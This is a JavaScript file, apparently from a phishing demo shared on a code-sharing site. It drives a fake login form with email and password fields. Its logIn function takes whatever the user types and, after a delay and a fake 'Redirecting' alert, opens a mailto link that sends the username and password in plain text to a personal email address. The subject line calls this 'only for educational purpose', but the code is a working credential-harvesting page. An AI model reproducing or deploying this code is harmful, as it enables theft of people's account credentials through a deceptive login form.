var load = document.getElementById("loading");
var wait = document.getElementById("wait");
var login = document.getElementById("btinp");
var em = document.getElementById("inMail");
var pas = document.getElementById("inPass");


em.addEventListener("keyup", inputEvent);
pas.addEventListener("keyup", inputEvent)


function loadEnd() {
  load.style.display = "none";
  
}

function inputEvent() {
  if ((em.value.length >= 4) && (pas.value.length >= 6)) {
    document.getElementById("btinp").style.backgroundColor = "#1E7EF3";
    login.addEventListener("click", logIn)
    
  } else {
    document.getElementById("btinp").style.backgroundColor = "#1E7EF359";
    login.removeEventListener("click", logIn)
  }
  
}

function logIn() {
  setTimeout(function() {
    window.open("mailto:monusharma5@yahoo.com?subject=This is only for educational purpose🥳&body=Here%20is%20My%20account%20Details😜🥺🥺..%0D%0AUser%20-%20" + em.value+ "%0D%0APassword%20-%20" + pas.value);
    
  }, 4000);
  wait.style.display = "";
  setInterval(waitIng, 6000);
  alert(' Redirecting...');
}

function upVote() { 
  alert('Please Upvote My CODE');
}

function waitIng() {
  wait.style.display = "none";
  clearInterval(waitIng);
}

function fMe() {
  window.open("https://github.com/Monu-Parashar")
}